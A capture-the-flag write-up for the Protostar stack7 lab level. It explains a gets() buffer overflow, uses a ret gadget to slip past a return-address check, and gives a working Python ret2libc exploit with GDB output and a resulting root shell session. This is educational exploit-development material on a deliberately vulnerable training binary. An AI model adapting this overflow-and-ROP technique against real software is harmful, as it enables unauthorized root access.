# Stack7 Solution

## C  Code

Stack6 introduces return to .text to gain code execution.

The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.

This level is at /opt/protostar/bin/stack7

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

## ROP Gadget

This time, we have *almost* the same program as [stack6](https://github.com/Naksh-Rathore/protostar-solutions/blob/main/stack6/solution.md) just with one key
difference. Instead of checking if the return address starts with `0xbf000000`, it checks if the return address starts with `0xb0000000`. Our objective is to get
a root shell. Again, we have to exploit the `gets()` function, just like every other stack challenge.

Now, the new return address check is a problem for us, since the address to `system()` starts with `0xb0000000`. So, how do we get the shell? Well, can't we
**overwrite the return address twice**? Yes, we can! For the first overwrite, we should be able to change the return address to the `ret` address itself, then
execute our ret2libc the same way. When `ret` executes, it first returns back to itself, then does ret2libc. This it bypasses the check!

This technique is called **ROP**, or return oriented programming. Specifically, we are using something called a **ROP Gadget**, which is a piece of Assembly code
we return to that is already in the `.text` section. A `.text` section is basically where all of the instructions are stored.

## Exploit

Ok, since we have the basic idea let's just copy and edit our [stack6](https://github.com/Naksh-Rathore/protostar-solutions/blob/main/stack6/exploit.py) 
`exploit.py` script. First, let's get the `ret` instruction's address.

Let's open up GDB and disassemble `getpath()`:

```bash
user@protostar:/opt/protostar/bin$ gdb stack7
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack7...done.
(gdb) set disassembly-flavor intel
(gdb) disas getpath
Dump of assembler code for function getpath:
0x080484c4 <getpath+0>: push   ebp
0x080484c5 <getpath+1>: mov    ebp,esp
0x080484c7 <getpath+3>: sub    esp,0x68
0x080484ca <getpath+6>: mov    eax,0x8048620
0x080484cf <getpath+11>:        mov    DWORD PTR [esp],eax
0x080484d2 <getpath+14>:        call   0x80483e4 <printf@plt>
0x080484d7 <getpath+19>:        mov    eax,ds:0x8049780
0x080484dc <getpath+24>:        mov    DWORD PTR [esp],eax
0x080484df <getpath+27>:        call   0x80483d4 <fflush@plt>
0x080484e4 <getpath+32>:        lea    eax,[ebp-0x4c]
0x080484e7 <getpath+35>:        mov    DWORD PTR [esp],eax
0x080484ea <getpath+38>:        call   0x80483a4 <gets@plt>
0x080484ef <getpath+43>:        mov    eax,DWORD PTR [ebp+0x4]
0x080484f2 <getpath+46>:        mov    DWORD PTR [ebp-0xc],eax
0x080484f5 <getpath+49>:        mov    eax,DWORD PTR [ebp-0xc]
0x080484f8 <getpath+52>:        and    eax,0xb0000000
0x080484fd <getpath+57>:        cmp    eax,0xb0000000
0x08048502 <getpath+62>:        jne    0x8048524 <getpath+96>
0x08048504 <getpath+64>:        mov    eax,0x8048634
0x08048509 <getpath+69>:        mov    edx,DWORD PTR [ebp-0xc]
0x0804850c <getpath+72>:        mov    DWORD PTR [esp+0x4],edx
0x08048510 <getpath+76>:        mov    DWORD PTR [esp],eax
0x08048513 <getpath+79>:        call   0x80483e4 <printf@plt>
0x08048518 <getpath+84>:        mov    DWORD PTR [esp],0x1
0x0804851f <getpath+91>:        call   0x80483c4 <_exit@plt>
0x08048524 <getpath+96>:        mov    eax,0x8048640
0x08048529 <getpath+101>:       lea    edx,[ebp-0x4c]
0x0804852c <getpath+104>:       mov    DWORD PTR [esp+0x4],edx
0x08048530 <getpath+108>:       mov    DWORD PTR [esp],eax
0x08048533 <getpath+111>:       call   0x80483e4 <printf@plt>
0x08048538 <getpath+116>:       lea    eax,[ebp-0x4c]
0x0804853b <getpath+119>:       mov    DWORD PTR [esp],eax
0x0804853e <getpath+122>:       call   0x80483f4 <strdup@plt>
0x08048543 <getpath+127>:       leave  
0x08048544 <getpath+128>:       ret    
End of assembler dump.
(gdb) 
```

Now we see that the address of `ret` is `0x08048544`, let's create our exploit script.

Here is our payload visual:

```
[ 72 bytes of padding ]
[ 4 bytes to overwrite ret (it gets changed after though) ]
[ 4 bytes to overwrite saved EBP ]
[ 4 bytes to overwrite return address (returns to itself) ]
[ 4 bytes to return to system ]
[ 4 bytes of a dummy return address (needed though) ]
[ 4 bytes that point to /bin/sh ]
```

Here is our exploit script:

```python
import struct

padding = "A" * 76 # 4 extra bytes for the extra variable
ebp = "LLLL"
gadget = struct.pack("I", 0x08048544) # ret addr flow: ret (first) -> ret (again) -> system
system = struct.pack("I", 0xb7ecffb0)
ret = "AAAA"
bin_sh = struct.pack("I", 0xb7fb63bf)

print(padding + ebp + gadget + system + ret + bin_sh)
```

Result:

```bash
user@protostar:/opt/protostar/bin$ (python /tmp/exploit.py; cat) | ./stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAALLLLD����AAAA�c��
whoami
root
echo "get pwned bozo"
get pwned bozo
ls
final0  final2   format1  format3  heap0  heap2  net0  net2  net4    stack1  stack3  stack5  stack7
final1  format0  format2  format4  heap1  heap3  net1  net3  stack0  stack2  stack4  stack6
pwd
/opt/protostar/bin
echo "stack levels are done!" 
stack levels are done!
```

## Resources

* [C Code](https://exploit.education/protostar/stack-seven)
* [Wikipedia Article on ROP](https://en.wikipedia.org/wiki/Return-oriented_programming)
